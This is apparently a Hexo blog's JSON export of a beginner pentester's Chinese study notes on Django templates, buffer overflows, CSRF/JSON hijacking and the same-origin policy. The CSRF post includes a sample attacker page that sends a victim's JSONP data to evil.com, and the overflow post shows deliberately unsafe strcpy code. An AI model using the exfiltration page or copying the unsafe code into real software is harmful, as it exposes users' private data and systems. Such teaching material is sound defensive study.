{"meta":{"title":"加油！少年","subtitle":"一切都是最好的安排","description":null,"author":"Almond","url":""},"pages":[{"title":"About","date":"2016-07-14T10:24:30.000Z","updated":"2016-07-14T10:24:30.000Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"Beginner of Pentest"},{"title":"归档","date":"2016-03-26T13:45:16.000Z","updated":"2016-03-26T13:46:42.000Z","comments":true,"path":"archive/index.html","permalink":"/archive/index.html","excerpt":"","text":""},{"title":"Categories","date":"2016-07-14T10:23:43.000Z","updated":"2016-07-14T09:54:41.000Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2016-07-14T10:05:25.000Z","updated":"2016-07-14T09:54:41.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Go Django III Models","slug":"Go-Django-III-Models","date":"2016-08-12T07:13:29.000Z","updated":"2016-08-12T07:17:46.000Z","comments":true,"path":"2016/08/12/Go-Django-III-Models/","link":"","permalink":"/2016/08/12/Go-Django-III-Models/","excerpt":"","text":"","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"},{"name":"Django","slug":"Django","permalink":"/tags/Django/"}]},{"title":"Metasploitable2","slug":"Metasploitable2","date":"2016-08-11T06:08:20.000Z","updated":"2016-08-11T06:16:06.000Z","comments":true,"path":"2016/08/11/Metasploitable2/","link":"","permalink":"/2016/08/11/Metasploitable2/","excerpt":"","text":"","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"pentest","slug":"pentest","permalink":"/tags/pentest/"},{"name":"metasploit","slug":"metasploit","permalink":"/tags/metasploit/"}]},{"title":"Go Django II Templates","slug":"Go-Django-II-Templates","date":"2016-07-23T10:36:26.000Z","updated":"2016-08-12T07:12:14.000Z","comments":true,"path":"2016/07/23/Go-Django-II-Templates/","link":"","permalink":"/2016/07/23/Go-Django-II-Templates/","excerpt":"Python中Web开发框架Django的学习记录。本篇主要学习了Django的模版。","text":"Python中Web开发框架Django的学习记录。本篇主要学习了Django的模版。 模版直接将HTML硬编码到视图里不是一个好主意，所以使用Django的模板系统(Template System)来实现页面设计和python代码的分离。 基本知识模版是一个文本，用于分离文档的表现形式和内容。模版定义了占位符以及各种用于规范文档该如何显示的各部分基本逻辑（模版标签）。模版通常用于产生HTML，但是Django的模版也能产生任何基于文本格式的文档 例： 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;&lt;title&gt;Ordering notice&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Ordering notice&lt;/h1&gt;&lt;p&gt;Dear &#123;&#123; person_name &#125;&#125;,&lt;/p&gt;&lt;p&gt;Thanks for placing an order from &#123;&#123; company &#125;&#125;. It&apos;s scheduled toship on &#123;&#123; ship_date|date:&quot;F j, Y&quot; &#125;&#125;.&lt;/p&gt;&lt;p&gt;Here are the items you&apos;ve ordered:&lt;/p&gt;&lt;ul&gt;&#123;% for item in item_list %&#125; &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;&#123;% endfor %&#125;&lt;/ul&gt;&#123;% if ordered_warranty %&#125; &lt;p&gt;Your warranty information will be included in the packaging.&lt;/p&gt;&#123;% else %&#125; &lt;p&gt;You didn&apos;t order a warranty, so you&apos;re on your own when the products inevitably stop working.&lt;/p&gt;&#123;% endif %&#125;&lt;p&gt;Sincerely,&lt;br /&gt;&#123;&#123; company &#125;&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 用两个大括号括起来的文字称为变量，这意味着在此处插入指定变量的值 被大括号和百分号包围的文本是模版标签，标签定义为仅通知模板系统完成某些工作的标签 {{ ship_date|date:\"F j, Y\" }} 是一个过滤器的例子，过滤器是一种最便捷的转换变量输出格式的方式。如这个例子中，将变量ship_data传递给date过滤器，同时制定参数”F j, Y”。过滤器将根据参数进行格式输出 如何使用模板系统在python代码中使用Django模板的最基本方式如下： 可以使用原始的模版代码字符串创建一个Template对象，Django同样支持用指定模版文件路径的方式来创建Template对象 调用模版对象的render方法，并传入一套变量context，它将返回一个代表完全渲染的模版的字符串，模版中的变量和标签会被context值替换 代码演示： 123456789from django import templatet = template.Template(&quot;my name is &#123;&#123; name &#125;&#125;.&quot;) #创建模版对象c = template.Context(&#123;&quot;name&quot;: &quot;Adrian&quot;&#125;)print t.render(c) #传递context来填充模版，返回值是一个Unicode对象my name is Adrian.c = template.Context(&#123;&quot;name&quot;: &quot;Fred&quot;&#125;)print t.render(c)my name is Fred. 示例： 1234567891011121314151617181920212223242526&gt;&gt;&gt; from django.template import Template, Context&gt;&gt;&gt; raw_template = &quot;&quot;&quot;&lt;p&gt;Dear &#123;&#123; person_name &#125;&#125;,&lt;/p&gt;...... &lt;p&gt;Thanks for placing an order from &#123;&#123; company &#125;&#125;. It&apos;s scheduled to... ship on &#123;&#123; ship_date|date:&quot;F j, Y&quot; &#125;&#125;.&lt;/p&gt;...... &#123;% if ordered_warranty %&#125;... &lt;p&gt;Your warranty information will be included in the packaging.&lt;/p&gt;... &#123;% else %&#125;... &lt;p&gt;You didn&apos;t order a warranty, so you&apos;re on your own when... the products inevitably stop working.&lt;/p&gt;... &#123;% endif %&#125;...... &lt;p&gt;Sincerely,&lt;br /&gt;&#123;&#123; company &#125;&#125;&lt;/p&gt;&quot;&quot;&quot;&gt;&gt;&gt; t = Template(raw_template)&gt;&gt;&gt; import datetime&gt;&gt;&gt; c = Context(&#123;&apos;person_name&apos;: &apos;John Smith&apos;,... &apos;company&apos;: &apos;Outdoor Equipment&apos;,... &apos;ship_date&apos;: datetime.date(2009, 4, 2),... &apos;ordered_warranty&apos;: False&#125;)&gt;&gt;&gt; t.render(c)u&quot;&lt;p&gt;Dear John Smith,&lt;/p&gt;\\n\\n&lt;p&gt;Thanks for placing an order from OutdoorEquipment. It&apos;s scheduled to\\nship on April 2, 2009.&lt;/p&gt;\\n\\n\\n&lt;p&gt;Youdidn&apos;t order a warranty, so you&apos;re on your own when\\nthe productsinevitably stop working.&lt;/p&gt;\\n\\n\\n&lt;p&gt;Sincerely,&lt;br /&gt;Outdoor Equipment&lt;/p&gt;&quot; 实际自己操作的时候，发现如果过滤器ship_date|date:”F j, Y”中添加了多余的空格的话，会导致创建模版对象出错 可以使用一个模版渲染多个context，非常高效 深度变量的查找模版系统能够非常简洁地处理更加复杂的数据结构，例如list，dictionary和自定义的对象 在Django模版中遍历复杂数据结构的关键是句点字符(.) 例如，向模板系统传递一个python字典，要通过字典键访问该字典的值，可使用一个句点 同样，也可以通过句点来访问对象的属性，比如说python的datetime.date对象有year，month，day几个属性（同样适用于自定义的类，总之，适用于任何对象） 点语法也可以用来引用对象的方法，例如python字符串都有upper()和isdigit()方法 注意，这里调用方法时并没有使用圆括号，而且也无法给该方法传递参数，只能调用不需要参数的方法 最后，句点也可用于访问列表索引，不允许使用负数列表索引 当模版系统在变量名中遇到点时，按照下面顺序尝试进行查找：字典类型，属性查找，方法调用，列表类型索引查找。系统使用第一个找到的有效类型，这是一种短路逻辑 句点查找可以多级深度嵌套，例如在下面这个例子中会转换成字典类型查找，然后是方法调用 注意，上图中出现的错误已经出现过很多次，要引以为戒！！ 方法调用行为方法调用比其它类型的查找略为复杂一点，以下是一些注意事项： 在方法查找过程中，如果某方法抛出一个异常，这个异常将被传播，除非这个异常有一个silent_variable_failure属性并且值为True。如果这个异常有silent_variable_failure属性，则模版里的指定变量会被置为空字符串 例如： 此时异常并没有silent_variable_failure属性，所以被抛出 此时异常有silent_variable_failure属性且为True，所以异常没被抛出，且指定变量被置为空字符串 这里我有个疑问，原文写的是 If the exception does have a silent_variable_failure attribute, the variable will render as an empty string 我理解的是只要有这个属性就会被置为空，于是实验了一下 发现不是我理解的意思。 总结一下：只有一个方法抛出的异常有silent_variable_failure属性且该属性的值为True时，这个异常才不会在渲染时被抛出，这时指定变量将被置为空字符串 有些方法是有副作用的，好的情况下允许模板系统访问它们可能只是干件蠢事，坏的情况下甚至会引发安全漏洞。例如，一个BankAccount对象有一个delete()方法，如果某个模板包含了像 {{ account.delete }} 这样的标签，其中account又是BankAccount的一个实例，请注意，在这个模板载入时，account对象将被删除。要防止这样的事情发生，必须设置该方法的alters_data属性： def delete(self): #codes delete.alters_data = True 模板系统不会执行任何以该方法进行标记的方法 如何处理无效变量默认情况下，如果一个变量不存在，模板系统会把它展示为空字符串。这个不存在的意思是：通过context传入的参数中没有模板中需要的字符串。如果context传入了一个模版中不存在的变量，模板系统将不理会 Context对象多数时间，可以通过传递一个完全填充的字典给Context()来初始化Context，但是初始化之后也可以使用标准的python字典语法向Context对象添加或删除条目 标签if/else1&#123;% if %&#125; 标签检查(evaluate)一个变量，如果这个变量为真（即，变量存在，非空，不是布尔值假），系统会显示在1&#123;% if %&#125;和&#123;% endif %&#125; 之间的任何内容1&#123;% else %&#125;和&#123;% elif %&#125; 标签是可选的。if标签不允许在同一个标签中同时使用and和or，因为逻辑上是模糊的。系统不支持用圆括号来组合比较操作。如果需要用到圆括号来组合逻辑式，将它移到模版之外处理，然后以模板变量的形式传入结果。或者仅仅用嵌套的if标签替换。一定要用1&#123;% endif %&#125;来关闭每一个&#123;% if %&#125;标签 for1&#123;% for %&#125; 允许在一个序列上迭代。与python中for语句的情形类似。每一次循环中，模板系统会渲染在 1&#123;% for %&#125;与&#123;% endfor %&#125; 之间的所有内容。可以给标签增加一个reversed使得该列表被反向迭代： 在迭代一个列表之前先检查列表的大小是一个常用的做法，因为这种做法非常常见，所以for标签支持一个可选的empty分句： Django不支持退出循环操作，同理，也不支持continue语句。 在每个for标签里有一个称为forloop的模版变量，这个变量有一些提示循环进度信息的属性 forloop.counter 总是一个表示当前循环的执行次数的整数计数器。 这个计数器是从1开始的，所以在第一次循环时 forloop.counter 将会被设置为1 123&#123;% for item in todo_list %&#125;&lt;p&gt;&#123;&#123; forloop.counter &#125;&#125;: &#123;&#123; item &#125;&#125;&lt;/p&gt; &#123;% endfor %&#125; forloop.counter0 类似于 forloop.counter ，但是它是从0计数的。 第一次执行循环时这个变量会被设置为0 forloop.revcounter 是表示循环中剩余项的整型变量。 在循环初次执行时forloop.revcounter 将被设置为序列中项的总数。 最后一次循环执行中，这个变量将被置1 forloop.revcounter0 类似于 forloop.revcounter ，但它以0做为结束索引。 在第一次执行循环时，该变量会被置为序列的项的个数减1 forloop.first 是一个布尔值，如果该迭代是第一次执行，那么它被置为True，在下面的情形中这个变量是很有用的： 12345&#123;% for object in objects %&#125;&#123;% if forloop.first %&#125;&lt;li class=&quot;first&quot;&gt;&#123;% else %&#125;&lt;li&gt;&#123;% endif %&#125;&#123;&#123; object &#125;&#125;&lt;/li&gt;&#123;% endfor %&#125; forloop.last 是一个布尔值；在最后一次执行循环时被置为True。 一个常见的用法是在一系列的链接之间放置管道符（|）： 1&#123;% for link in links %&#125;&#123;&#123; link &#125;&#125;&#123;% if not forloop.last %&#125; | &#123;% endif %&#125;&#123;% endfor %&#125; 上面的模板可能会产生如下的结果： 1Link1 | Link2 | Link3 | Link4 另一个常见的用途是为列表的每个单词的加上逗号： 1&#123;% for p in places %&#125;&#123;&#123; p &#125;&#125;&#123;% if not forloop.last %&#125;, &#123;% endif %&#125;&#123;% endfor %&#125; forloop.parentloop 是一个指向当前循环的上一级循环的 forloop 对象的引用（在嵌套循环的情况下），例如： 1234567891011&#123;% for country in countries %&#125; &lt;table&gt; &#123;% for city in country.city_list %&#125; &lt;tr&gt; &lt;td&gt;Country #&#123;&#123; forloop.parentloop.counter &#125;&#125;&lt;/td&gt; &lt;td&gt;City #&#123;&#123; forloop.counter &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; city &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/table&gt;&#123;% endfor %&#125; 对于自己定义的forloop变量的处理有些复杂，所以只要记住不要定义一个叫做forloop的变量！！！ ifequal/ifnotequal{% ifequal %}比较两个值，当它们相等时，显示在{% ifequal %}和{% endifequal %}之间的所有值 过滤器过滤器是在变量被显示前修改它的值的一个简单方法，过滤器使用管道字符 {{ name|lower }} 过滤管道可以套接，也就是使用多个| 有些过滤器有参数，过滤器的参数跟随冒号之后并且总是以双引号包含，例如下例将输出变量bio的前30个词 {{ bio|truncatewords:\"30\" }} 模板加载Django提供了一种方便且功能强大的API，用于从磁盘中加载模板，要使用此模板加载API，首先必须将模板的保存位置告诉框架，设置的保存文件就是settings.py 123456789101112131415TEMPLATES = [ &#123; &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;, &apos;DIRS&apos;: [], &apos;APP_DIRS&apos;: True, &apos;OPTIONS&apos;: &#123; &apos;context_processors&apos;: [ &apos;django.template.context_processors.debug&apos;, &apos;django.template.context_processors.request&apos;, &apos;django.contrib.auth.context_processors.auth&apos;, &apos;django.contrib.messages.context_processors.messages&apos;, ], &#125;, &#125;,] 其中DIRS就是模板的保存位置，我的位置为os.path.join(os.path.dirname(os.path.dirname(__file__)), ‘templates’).replace(‘\\\\’, ‘/‘)，因为我在mysite目录下创建了一个templates目录 template.html: 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;It it &#123;&#123; current_date &#125;&#125; now.&lt;/body&gt;&lt;/html&gt; 然后修改视图 12345678910from django.http import HttpResponseimport datetimefrom django.template.loader import get_templatefrom django.template import Contextdef current_datatime(request): now = datetime.datetime.now() t = get_template(&apos;template.html&apos;) html = t.render(Context(&#123;&apos;current_date&apos;: now&#125;)) return HttpResponse(html) 使用函数django.template.loader.get_template函数加载模板 结果： render()此函数在django.shortcuts模块，可以让用户以一行代码完成载入某个模板文件，渲染它，然后将此作为HttpResponse返回多种功能 1234567from django.http import HttpResponseimport datetimefrom django.shortcuts import renderdef current_datatime(request): now = datetime.datetime.now() return render(request, &apos;template.html&apos;, &#123;&apos;current_date&apos;: now&#125;) include模版标签此标签允许在模板中包含其它的模版内容，标签的参数是要包含的模版的名称，可以是一个变量，也可以是用单／双引号硬编码的字符串 {% include 'template2.html' %} 模板继承模板继承可以解决重复和冗余代码的问题，这个策略比include更加优雅，本质上来说，模板继承就是先构造一个基础框架模板，然后在其子模板中对它所包含站点公用部分和定义块进行重载 定义一个base.html 1234567891011121314&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;My helpful timestamp site&lt;/h1&gt; &#123;% block content %&#125;&#123;% endblock %&#125; &#123;% block footer %&#125; &lt;hr&gt; &lt;p&gt;Thanks for visiting my site.&lt;/p&gt; &#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; block标签告诉模板引擎这部分可以和可能被子模板修改（可能的意思是也可以不修改，这种情况下依然用父模板的内容） 此时current_template.html： 1234567&#123;% extends &quot;base.html&quot; %&#125;&#123;% block title %&#125;The current time&#123;% endblock %&#125;&#123;% block content %&#125;&lt;p&gt;It is now &#123;&#123; current_date &#125;&#125;.&lt;/p&gt;&#123;% endblock %&#125; hours_ahead.html： 1234567&#123;% extends &quot;base.html&quot; %&#125;&#123;% block title %&#125;Future time&#123;% endblock %&#125;&#123;% block content %&#125;&lt;p&gt;In &#123;&#123; hour_offset &#125;&#125; hour(s), it will be &#123;&#123; next_time &#125;&#125;.&lt;/p&gt;&#123;% endblock %&#125; 以上两个子模板没有对block footer进行重载，所以页面底部还是父模板的内容 模板继承的一些guidelines: 如果在模板中使用extends标签 ，必须保证其为模板中的第一个模板标记。 否则，模板继承将不起作用。 一般来说，基础模板中的block标签越多越好。 记住，子模板不必定义父模板中所有的代码块，因此你可以用合理的缺省值对一些代码块进行填充，然后只对子模板所需的代码块进行（重）定义。 俗话说，钩子越多越好。 如果发觉自己在多个模板之间拷贝代码，你应该考虑将该代码段放置到父模板的某个block标签中。 如果你需要访问父模板中的块的内容，使用 这个标签吧，这一个魔法变量将会表现出父模板中的内容。 如果只想在上级代码块基础上添加内容，而不是全部重载，该变量就显得非常有用了。 不允许在同一个模板中定义多个同名的block标签。 存在这样的限制是因为block 标签的工作方式是双向的。 也就是说，block 标签不仅挖了一个要填的坑，也定义了在父模板中这个坑所填充的内容。如果模板中出现了两个相同名称的block标签，父模板将无从得知要使用哪个块的内容。 extends标签对所传入模板名称使用的加载方法和 get_template() 相同。 也就是说，会将模板名称被添加到 TEMPLATE_DIRS 设置之后。 多数情况下，extends标签的参数应该是字符串，但是如果直到运行时方能确定父模板名，这个参数也可以是个变量。 这使得你能够实现一些很酷的动态功能。","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"},{"name":"Django","slug":"Django","permalink":"/tags/Django/"}]},{"title":"Bypass XSS protection","slug":"Bypass-XSS-protection","date":"2016-07-22T08:01:41.000Z","updated":"2016-08-11T06:14:22.000Z","comments":true,"path":"2016/07/22/Bypass-XSS-protection/","link":"","permalink":"/2016/07/22/Bypass-XSS-protection/","excerpt":"XSS各种过滤，净化，XSS filter的绕过","text":"XSS各种过滤，净化，XSS filter的绕过","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Web","slug":"Web","permalink":"/tags/Web/"}]},{"title":"Buffer Overflow","slug":"Buffer-Overflow","date":"2016-07-21T01:25:18.000Z","updated":"2016-07-30T11:32:44.000Z","comments":true,"path":"2016/07/21/Buffer-Overflow/","link":"","permalink":"/2016/07/21/Buffer-Overflow/","excerpt":"缓冲区溢出是一种非常普遍，非常危险的漏洞，在各种操作系统，应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。","text":"缓冲区溢出是一种非常普遍，非常危险的漏洞，在各种操作系统，应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。 缓冲区溢出漏洞如果应用程序将用户可控制的数据复制到一个不足以容纳它们的内存缓存区中，就会出现缓冲区溢出漏洞。由于目标缓冲区溢出，导致临近的内存被用户数据重写。攻击者可以根据漏洞的特点利用它在服务器上运行任意代码或执行其它未授权操作。 栈溢出如果应用程序在没有确定大小固定的缓冲区的容量是否足够大之前，就使用一个无限制的复制操作（如C语言中的strcpy函数）将一个大小可变的缓冲区复制到这个大小固定的缓冲区中，往往就会造成缓冲区溢出，例如： 12345bool CheckLogin(char* username, char* password)&#123; char _username[32]; strcpy(_username, username);&#125; 如果username超过32个字符，_username缓冲区就会溢出 在成功利用栈缓冲区溢出的攻击中，攻击者通常能够重写栈上已保存的返回地址 堆溢出从本质上讲，堆缓冲区溢出也是由前面描述的相同危险操作造成的，唯一的不同在于这是溢出的目标缓冲区在堆上： 12345bool CheckLogin(char* username, char* password)&#123; char* _username = (char*) malloc(32); strcpy(_username, username);&#125; 堆以一个双向链表的形式执行：在内存中，每个块的前面是一个控制结构，其中包含块的大小、一个指向堆上前一个块的指针以及一个指向堆上后一个块的指针。当堆缓冲区溢出时，邻近的堆块的控制结构被用户所控制的数据重写 与栈溢出漏洞相比，利用这种漏洞更困难，但是，一种常见的利用方法是在被重写的堆控制结构中写入专门的值，以在将来某个时刻重写任何一个关键的指针。以下是这种方法的原理： 被重写的堆块从内存中释放，此时堆管理器需要根据这个堆块更新堆块链表 堆管理器更新此堆块的后一个堆块的反向链接指针，前一个堆块的正向链接指针 这个堆块被重写过，于是指针就链接到了攻击者想到达的地址 “一位偏移”漏洞如果编程错误使得攻击者可以在一个被分配的缓冲区之后写入一个字节（或少数几字节），就会发生一种特殊的溢出漏洞，例： 12345678bool CheckLogin(char* username, char* password)&#123; char _username[32]; int i; for (i=0;username[i]&amp;&amp;i&lt;32;i++) _username[i]=username[i]; _username[i] = 0;&#125; 这段代码在栈上分配一个缓冲区，执行一项计数缓冲区复制操作，然后以空字节结束目标字符串。如果username刚好有32B或更多，那么用于结束字符串的空字节将写在缓冲区之外，如果栈上邻近的数据是调用帧（calling frame）的已保存的帧指针（saved frame pointer），那么低字节设为零可能会导致它指向_username缓冲区，因而指向攻击者控制的数据 如果开发者忽略在字符串缓冲区中为一个空字节终止符预留空间，在堆内存中也会引发问题，如下代码本意是修复堆溢出漏洞： 123456bool CheckLogin(char* username, char* password)&#123; char* _username[32]; strncpy(_username, username, 32); ...&#125; 这时，如果用户名比预留的缓冲区更长，那么将没有空间留给空字节，这会导致一些语言（如C）无法结束这个字符串直到它遇到内存中的下一个空字节为止 查找缓冲区溢出漏洞向一个确定的目标发送较长的字符串并监控反常结果是查找缓冲区溢出漏洞的基本方法。有时候一些细微的漏洞只有通过发送一个特殊长度或者在较小的长度范围内的超长字符串才能检测出来 向每一个目标数据提交一系列稍大于常用缓冲区大小的长字符串，如：1100，4200，33000 一次针对一个数据实施攻击，最大程度覆盖应用程序中的所有代码路径 可以使用burp intruder中的字符块有效载荷来源自动生成各种大小的有效载荷 监控应用程序的响应，确定所有反常现象，例如： HTTP500状态码或错误消息，这时其他畸形（而非超长）输入不会产生相同的结果 内容详细的消息，表示某个本地组件发生故障 服务器收到一个局部或畸形响应 服务器的TCP连接未返回响应，突然关闭 整个Web应用程序停止响应 注意，如果一个堆溢出被触发，这可能会在将来而非立即导致系统崩溃，因此，必须进行试验，确定一种或几种造成堆“腐化”的测试字符串 “一位偏移”漏洞可能不会造成系统崩溃，但可能会导致反常行为，例如返回意外的数据","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"computersecurity","slug":"computersecurity","permalink":"/tags/computersecurity/"}]},{"title":"Cross Site Request Forgery","slug":"Cross-Site-Request-Forgery","date":"2016-07-19T01:39:42.000Z","updated":"2016-07-22T08:25:59.000Z","comments":true,"path":"2016/07/19/Cross-Site-Request-Forgery/","link":"","permalink":"/2016/07/19/Cross-Site-Request-Forgery/","excerpt":"CSRF全称Cross Site Request Forgery，即跨站点请求伪造。来源：http://drops.wooyun.org/web/15556","text":"CSRF全称Cross Site Request Forgery，即跨站点请求伪造。来源：http://drops.wooyun.org/web/15556 0x1 简介跨站点请求伪造是攻击者构造的并非用户本意的请求被用户被动发出，攻击过程大致如图：例如攻击者在自己的网站构造了一个针对某网站的请求，然后诱骗受害者访问他的网站，而受害者又登录了被伪造请求的站点，此时这个伪造的请求将由被害者发出。比如攻击者可以诱使用户留言，更甚者可以让管理员添加一个被害者可以操控的账号为管理账号。 0x2 攻击方式0x2.1 HTML CSRF攻击即利用HTML元素发出GET请求（带有src属性的HTML标签都可以跨域发起GET请求），如： &lt;link href=”…”&gt; &lt;img src=”…”&gt; &lt;iframe src=”…”&gt; &lt;meta http-equiv=”refresh” content=”0; url=…”&gt; &lt;script src=”…”&gt; &lt;video src=”…”&gt; &lt;audio src=”…”&gt; &lt;a href=”…”&gt; &lt;table background=”…”&gt; … 若要构造POST请求，则必须用表单提交的方式。另外，这些标签也可以用javascript动态生成，如： 123&lt;script&gt; new Image().src=&apos;http://www.goal.com/...&apos;&lt;/script&gt; 0x2.2 JSON HiJacking攻击JSON是一种数据格式，主要由字典和列表两种存在形式，并且这两种形式也可以互相嵌套，常应用于数据传输的过程中。 JSONP(JSON with Padding)是一种非官方的协议，是Web前端的javascript跨域获取数据的一种方式。javascript在读写数据时受到同源策略的限制，不可以读写其他的数据，于是大家想出了这样一种办法： 前端html代码： 123456789101112&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; function jsonpCallback(result) &#123; alert(result.a); alert(result.b); alert(result.c); for(var i in result) &#123; alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc. &#125; &#125; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://crossdomain.com/services.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt; 后端php代码： 123456789&lt;?php //服务端返回JSON数据 $arr=array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3,&apos;d&apos;=&gt;4,&apos;e&apos;=&gt;5); $result=json_encode($arr); //echo $_GET[&apos;callback&apos;].&apos;(&quot;Hello,World!&quot;)&apos;; //echo $_GET[&apos;callback&apos;].&quot;($result)&quot;;//动态执行回调函数 $callback=$_GET[&apos;callback&apos;]; echo $c 前端先是定义了jsonpCallback函数来处理后端返回的JSON数据，然后利用script标签的src属性跨域获取数据（前面说到带src属性的html标签都可以跨域），并且把刚才定义的回调函数的名称传递给了后端，于是后端构造出“jsonpCallback({“a”:1, “b”:2, “c”:3, “d”:4, “e”:5})”的函数调用过程返回到前端执行，达到了跨域获取数据的目的。 一句话描述JSONP：前端定义函数却在后端完成调用然后回到前端执行 明白了JSONP的调用过程之后，可以想象这样的场景： 当用户通过身份验证之后，前端会通过JSONP的方式从服务端获取该用户的隐私数据，然后再前端进行一些处理，如个性化显示等等。这个JSONP的调用借口如果没有做相应的防护，就容易受到JSON HiJacking的攻击，以上面的情景为例，攻击者可以构造以下html页面： 12345678910111213&lt;html&gt;&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; function hijack(result) &#123; var data = &apos;&apos;; for(var i in result) &#123; data += i + &apos;:&apos; + result[i]; &#125; new Image().src = &quot;http://www.evil.com/JSONHiJacking.php?data=&quot; + escape(data);//把数据发送到攻击者服务器上 &#125; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://crossdomain.com/services.php?callback=hijack&quot;&gt;&lt;/script&gt;&lt;/html&gt; 攻击者在页面中构造了自己的回调函数，把获取的数据都发送到了自己的服务器上。如果受害者已经经过身份认证并访问了此页面，隐私将被暴露 0x3 CSRF的危害CSRF能做的事情大概如下： 篡改目标网站上的用户数据 盗取用户隐私数据 作为其他攻击向量的辅助攻击手法 传播CSRF蠕虫 例子： 添加管理员＋后台getshell http://www.wooyun.org/bugs/wooyun-2010-091886 直接在前端getshell http://www.wooyun.org/bugs/wooyun-2010-091875 0x4 CSRF的防御跨域请求伪造可以通过解决“跨域”问题来解决： HTTP请求头部的Referer检查（不过需要说明的是，有的时候请求并不需要跨域，有的时候甚至没有Referer字段） 还可以解决“伪造”，攻击者之所以能够伪造请求，是因为请求中的参数值都是可以预测的，如果有无法预测的参数值，那么将无法伪造请求，基于此，有如下两种方法来防御： 添加验证码（但可能会影响用户体验） 使用一次性token（一定要足够随机） 除了以上两点，CSRF都是发生在受害者已经完成身份认证之后发生的，基于这一点，可以用一些_缓解_CSRF攻击的方法： 比如缩短session的有效时间等","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Web","slug":"Web","permalink":"/tags/Web/"}]},{"title":"Same Origin Policy","slug":"Same-Origin-Policy","date":"2016-07-15T07:07:10.000Z","updated":"2016-07-29T08:34:44.000Z","comments":true,"path":"2016/07/15/Same-Origin-Policy/","link":"","permalink":"/2016/07/15/Same-Origin-Policy/","excerpt":"同源策略来源：http://blog.csdn.net/shimiso/article/details/21830313","text":"同源策略来源：http://blog.csdn.net/shimiso/article/details/21830313 同源策略同源策略是浏览器上为安全性考虑实施的非常重要的安全策略。同源是指域名（根，子），协议，端口都相同，不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。 比如一个恶意网站的页面通过iframe嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码 在浏览器中，&lt;script&gt; &lt;img&gt; &lt;iframe&gt; &lt;link&gt;等标签都可以加载跨域资源，而不受同源限制，但浏览器限制了javascript的权限，使其不能读，写加载的内容 另外同源策略只对网页的HTML文档做了限制，对加载的其他静态资源如javascript，css，图片等仍然认为属于同源 代码实例： 123456789101112131415161718http://localhost:8080/test.html &lt;html&gt; &lt;head&gt;&lt;title&gt;test same origin policy&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;iframe id=&quot;test&quot; src=&quot;http://localhost:8081/test2.html&quot;&gt;&lt;/iframe&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.getElementById(&quot;test&quot;).contentDocument.body.innerHTML = &quot;write somthing&quot;; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; http://localhost:8081/test2.html &lt;html&gt; &lt;head&gt;&lt;title&gt;test same origin policy&lt;/title&gt;&lt;/head&gt; &lt;body&gt; Testing. &lt;/body&gt; &lt;/html&gt; 两个网址端口不同所以不同源，上面网页试图对加载的下面的网页进行写操作，会被拒绝 Document对象的domain属性存放着装载文档的服务器的主机名，可以设置它。例如来自blog.csdn.net和来自bbs.csdn.net的页面，都将documents.domain设置为csdn.net，则来自两个子域名的脚本即可相互访问。出于安全的考虑，不能设置为其他主domain，比如http://www.csdn.net不能设置为sina.com Ajax跨域Ajax(XMLHttpRequest)请求受到同源策略的限制 